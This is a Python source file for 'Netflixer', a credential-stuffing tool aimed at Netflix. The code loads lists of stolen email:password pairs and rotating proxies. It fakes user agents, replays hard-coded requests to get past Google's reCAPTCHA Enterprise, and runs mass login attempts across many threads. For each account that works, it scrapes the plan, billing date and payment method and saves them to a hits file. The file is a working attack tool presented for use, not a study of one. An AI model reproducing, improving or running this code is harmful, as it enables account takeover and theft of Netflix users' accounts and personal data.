import os, re, time, random, threading, requests, easygui, datefinder
from colorama import Fore
from bs4 import BeautifulSoup

from user_agent.user_agent import UserAgentGenerator

import logging

# Credit to Pycenter by billythegoat356
# Github: https://github.com/billythegoat356/pycenter/
# License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE



# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Set the logging level
    format='%(asctime)s - %(levelname)s - %(message)s',  # Log message format
    handlers=[
        logging.FileHandler("netflixer.log"),  # Log to a file
        logging.StreamHandler()  # Log to console
    ]
)


class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.proxy_types = {0: "http", 1: "socks4", 2: "socks5"}

    def load_proxies(self):
        try:
            path = self._get_proxy_file_path()
            proxy_type = self._get_proxy_type()
            self._read_proxies(path, proxy_type)
            logging.info(f"Successfully loaded {len(self.proxies)} proxies")
        except Exception as e:
            logging.error(f"Error loading proxies: {e}")
            raise

    def _get_proxy_file_path(self):
        path = easygui.fileopenbox(
            default="*.txt",
            filetypes=["*.txt"],
            title="Netflixer - Select proxy",
            multiple=False,
        )
        if not path:
            raise ValueError("No proxy file selected")
        return path

    def _get_proxy_type(self):
        while True:
            try:
                choice = int(input(f"[{Fore.LIGHTBLUE_EX}?{Fore.RESET}] Proxy type [{Fore.LIGHTBLUE_EX}0{Fore.RESET}]HTTP/[{Fore.LIGHTBLUE_EX}1{Fore.RESET}]SOCKS4/[{Fore.LIGHTBLUE_EX}2{Fore.RESET}]SOCKS5> "))
                if choice in self.proxy_types:
                    return self.proxy_types[choice]
                logging.warning("Invalid choice. Please enter 0, 1, or 2.")
            except ValueError:
                logging.warning("Please enter a number.")

    def _read_proxies(self, path, proxy_type):
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                proxy = line.strip().split(":")
                if len(proxy) >= 2:
                    self.proxies.append({proxy_type: f"{proxy_type}://{proxy[0]}:{proxy[1]}"})

    def get_random_proxy(self):
        return random.choice(self.proxies) if self.proxies else None
    

class ComboManager:
    def __init__(self):
        self.combos = []

    def load_combos(self):
        try:
            path = self._get_combo_file_path()
            self._read_combos(path)
            logging.info(f"Successfully loaded {len(self.combos)} combos")
        except Exception as e:
            logging.error(f"Error loading combos: {e}")
            raise

    def _get_combo_file_path(self):
        path = easygui.fileopenbox(
            default="*.txt",
            filetypes=["*.txt"],
            title="Netflixer - Select combos",
            multiple=False,
        )
        if not path:
            raise ValueError("No combo file selected")
        return path

    def _read_combos(self, path):
        with open(path, "r", encoding="utf-8") as f:
            self.combos = [l.strip() for l in f]

    def get_combo_slice(self, start, end):
        return self.combos[start:end]


def center(var: str, space: int = None):  # From Pycenter
    if not space:
        space = (os.get_terminal_size().columns- len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

class Netflixer:
    def __init__(self):
        # if os.name == "posix":
        #     print("WARNING: This program is designed to run on Windows only.")
        #     quit(1)
        self.proxy_manager = ProxyManager()
        self.combo_manager = ComboManager()
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0
        self.retries = 0
        self.lock = threading.Lock()
        self.ua_generator = UserAgentGenerator()
        self.start_time = None

    def ui(self):
        """
        Displays the user interface for the Netflixer tool, including a title and a welcome message.
        This method clears the terminal screen and prints a stylized title along with the GitHub link.
        """

        self._clear_screen()
        self._print_title()
        self._print_github_link()

        os.system("cls && title [NETFLIXER] - Made by Plasmonix")

        print(center(f"{Fore.LIGHTYELLOW_EX}\ngithub.com/Plasmonix\n{Fore.RESET}"))

    def _clear_screen(self):
            os.system("cls && title [NETFLIXER] - Made by Plasmonix")

    def _print_title(self):
        text = """
    
            ███▄    █ ▓█████▄▄▄█████▓  █████▒██▓     ██▓▒██   ██▒▓█████  ██▀███  
            ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██   ▒▓██▒    ▓██▒▒▒ █ █ ▒░▓█   ▀ ▓██ ▒ ██▒
            ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒████ ░▒██░    ▒██▒░░  █   ░▒███   ▓██ ░▄█ ▒
            ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░▓█▒  ░▒██░    ░██░ ░ █ █ ▒ ▒▓█  ▄ ▒██▀▀█▄  
            ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░▒█░   ░██████▒░██░▒██▒ ▒██▒░▒████▒░██▓ ▒██▒
            ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░    ▒ ░   ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒▓ ░▒▓░
            ░ ░░   ░ ▒░ ░ ░  ░   ░     ░     ░ ░ ▒  ░ ▒ ░░░   ░▒ ░ ░ ░  ░  ░▒ ░ ▒░
                ░   ░ ░    ░    ░       ░ ░     ░ ░    ▒ ░ ░    ░     ░     ░░   ░ 
                    ░    ░  ░                   ░  ░ ░   ░    ░     ░  ░   ░    """
        
        faded = ""
        red = 40
        for line in text.splitlines():
            faded += f"\033[38;2;{red};0;220m{line}\033[0m\n"
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))

    def _print_github_link(self):
        print(center(f"{Fore.LIGHTYELLOW_EX}\ngithub.com/Plasmonix\n{Fore.RESET}"))
        
    def cpm_counter(self):
        """
        Continuously updates the logins per minute (CPM) counter.
        This method runs in a separate thread and updates the CPM every 4 seconds based on the number of hits.
        """
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new - old) * 15

    def update_title(self):
        """
        Updates the terminal window title with the current statistics of the Netflixer tool.
        This method runs in a separate thread and updates the title every 0.4 seconds with hits, bad attempts, retries, CPM, thread count, and elapsed time.
        """
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(
                f"title [NETFLIXER] - Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}"
            )
            time.sleep(0.4)


    def get_auth_url(self):
        """
        Retrieves the authentication URL required for logging into Netflix.
        
        Returns:
            str: The authentication URL extracted from the Netflix login page.
        
        Raises:
            Exception: If the proxy times out after multiple attempts.
        """
        max_attempts = 5  # Set a maximum number of retry attempts
        for attempt in range(max_attempts):
            try:
                login = requests.get(
                    "https://www.netflix.com/login",
                    headers={"user-agent": self.ua_generator.get_random_user_agent()},
                    proxies=self.proxy_manager.get_random_proxy(),
                )
                authURL = re.search(r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text).group(1)
                logging.info("Successfully retrieved authURL")
                return authURL
            except:
                logging.warning(f"Proxy timeout on attempt {attempt + 1}. Retrying...")
                if attempt == max_attempts - 1:
                    logging.error("Failed to retrieve authURL after multiple attempts")
                    raise Exception("Failed to retrieve authURL after multiple attempts")
                time.sleep(2)

    def extract_date(self, input_string):
        """
        Extracts the most relevant date from a given string using datefinder.
        
        Parameters:
            input_string (str): The string from which to extract the date.
        
        Returns:
            str: The extracted date in the format "dd Month YYYY", or None if no date is found.
        """
        dates = list(datefinder.find_dates(input_string))
        return (
            max(dates, default=None, key=lambda d: len(str(d))).strftime("%d %B %Y")
            if dates
            else None
        )

    def bypass_captcha(self):
        """
        Handles the CAPTCHA bypassing process by interacting with Google's reCAPTCHA service.
        
        Returns:
            str: The CAPTCHA response token.
        
        Raises:
            Exception: If the CAPTCHA bypass fails after multiple attempts.
        """
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                req = requests.get(
                    "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
                    headers={
                        "Accept": "*/*",
                        "Pragma": "no-cache",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                    },
                    
                )
                token = "".join(
                    re.findall(
                        'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
                    )
                )
                headers = {
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                    "origin": "https://www.google.com",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
                    "Pragma": "no-cache",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw ",
                }
                data = {
                    "v": "Km9gKuG06He-isPsP6saG8cn",
                    "reason": "q",
                    "c": token,
                    "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                    "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
                    "chr": "%5B38%2C84%2C94%5D",
                    "vh": "-1149792284",
                    "bg": "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
                    "size": "invisible",
                    "hl": "en",
                    "cb": "eeb8u2c3dizw",
                }
                req = requests.post(
                    "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
                    headers=headers,
                    data=data,
                )
                captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
                logging.info("Successfully bypassed CAPTCHA")
                return captcha_token
            except Exception as e:
                logging.warning(f"CAPTCHA bypass attempt {attempt + 1} failed: {e}")
                if attempt == max_attempts - 1:
                    logging.error(f"CAPTCHA bypass failed after {max_attempts} attempts")
                    raise Exception(f"CAPTCHA bypass failed after {max_attempts} attempts: {str(e)}")
                time.sleep(2)

    def checker(self, email, password):
        """
        Attempts to log in to Netflix using the provided email and password.
        
        Parameters:
            email (str): The email address to use for login.
            password (str): The password to use for login.
        
        Raises:
            requests.exceptions.RequestException: If there is a network-related error during the login attempt.
        """
        try:
            client = requests.Session()
            user_agent = self.ua_generator.get_random_user_agent()

            headers = {
                "User-agent": user_agent,
                "Accept-language": "en-US,en;q=0.9",
                "Accept-encoding": "gzip, deflate, br",
                "Referer": "https://www.netflix.com/login",
                "Content-type": "application/x-www-form-urlencoded",
            }

            data = {
                "Userloginid": email,
                "Password": password,
                "Remembermecheckbox": "true",
                "Flow": "websiteSignUp",
                "Mode": "login",
                "Action": "loginAction",
                "Withfields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                "Authurl": self.get_auth_url(),
                "Nextpage": "https://www.netflix.com/browse",
                "recaptchaResponseToken": self.bypass_captcha(),
                "recaptchaResponseTime": random.randint(100, 800),
            }

            req = client.post(
                "https://www.netflix.com/login",
                headers=headers,
                data=data,
                proxies=self.proxy_manager.get_random_proxy(),
                timeout=10,
            )
            if "/browse" in req.url:
                self._handle_successful_login(email, password, client)
            else:
                self._handle_failed_login(email, password)
        except requests.exceptions.RequestException:
            logging.error("Proxy timeout. Change your proxies or use a different VPN")
            self.retries += 1
        except Exception as e:
            logging.error(f"Unexpected error in checker: {e}")
            self.retries += 1


    def _handle_successful_login(self, email, password, client):
        try:
            # Fetch account page
            account_page = client.get("https://www.netflix.com/YourAccount")
            soup = BeautifulSoup(account_page.text, 'html.parser')

            # Extract account information
            plan = self._extract_plan(soup)
            expiry = self._extract_expiry(soup)
            member_since = self._extract_member_since(soup)
            payment_method = self._extract_payment_method(soup)

            # Log the hit
            logging.info(f"HIT | {email} | {password} | {plan} | {expiry}")
            self.hits += 1

            # Save to file
            with self.lock:
                with open("./results/hits.txt", "a", encoding="utf-8") as fp:
                    fp.write(f"{email}:{password} | Member since = {member_since} | Plan = {plan} | Validity = {expiry} | Payment method = {payment_method}\n")

        except Exception as e:
            logging.error(f"Error processing successful login for {email}: {e}")

    def _extract_plan(self, soup):
        try:
            plan_element = soup.find('div', {'data-uia': 'plan-label'})
            return plan_element.text.strip() if plan_element else "Unknown"
        except:
            return "Unknown"

    def _extract_expiry(self, soup):
        try:
            expiry_element = soup.find('div', {'data-uia': 'nextBillingDate-item'})
            return self.extract_date(expiry_element.text) if expiry_element else "Unknown"
        except:
            return "Unknown"

    def _extract_member_since(self, soup):
        try:
            member_since_element = soup.find('div', {'data-uia': 'member-since'})
            return self.extract_date(member_since_element.text) if member_since_element else "Unknown"
        except:
            return "Unknown"

    def _extract_payment_method(self, soup):
        try:
            payment_method_element = soup.find('span', {'data-uia': 'payment-method'})
            return payment_method_element.text.strip() if payment_method_element else "Unknown"
        except:
            return "Unknown"

    def _handle_failed_login(self, email, password):
        logging.info(f"BAD | {email} | {password}")
        self.bad += 1

    def worker(self, combos, thread_id):
        """
        Processes a subset of email:password combinations in a separate thread.
        
        Parameters:
            combos (list): The list of email:password combinations to check.
            thread_id (int): The ID of the thread for tracking progress.
        """
        for combo in combos:
            email, password = combo.split(":")
            self.checker(email, password)


    def main(self):
        """
        The main entry point for the Netflixer tool. It orchestrates the user interface, proxy and combo loading,
        thread management, and the overall login checking process.
        """
        logging.info("Starting Netflixer")
        self.ui()
        self.proxy_manager.load_proxies()
        self.combo_manager.load_combos()
        self.threadcount = self._get_thread_count()

        self.ui()
        self.start_time = time.time()
        threading.Thread(target=self.cpm_counter, daemon=True).start()
        threading.Thread(target=self.update_title, daemon=True).start()

        self._start_worker_threads()

        logging.info("Task completed")
        os.system("pause>nul")

    def _get_thread_count(self):
        """
        Prompts the user to input the number of threads to use.
        
        Returns:
            int: The number of threads specified by the user.
        """
        while True:
            try:
                return int(input(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Threads> "))
            except ValueError:
                logging.error("Invalid thread count input. Please enter a number.")

    def _start_worker_threads(self):
        """
        Starts the worker threads to process the combos.
        """
        threads = []
        combo_count = len(self.combo_manager.combos)
        for i in range(self.threadcount):
            start = int(combo_count / self.threadcount * i)
            end = int(combo_count / self.threadcount * (i + 1))
            sliced_combo = self.combo_manager.get_combo_slice(start, end)
            t = threading.Thread(target=self.worker, args=(sliced_combo, i))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()


if __name__ == "__main__":
    Netflixer().main()
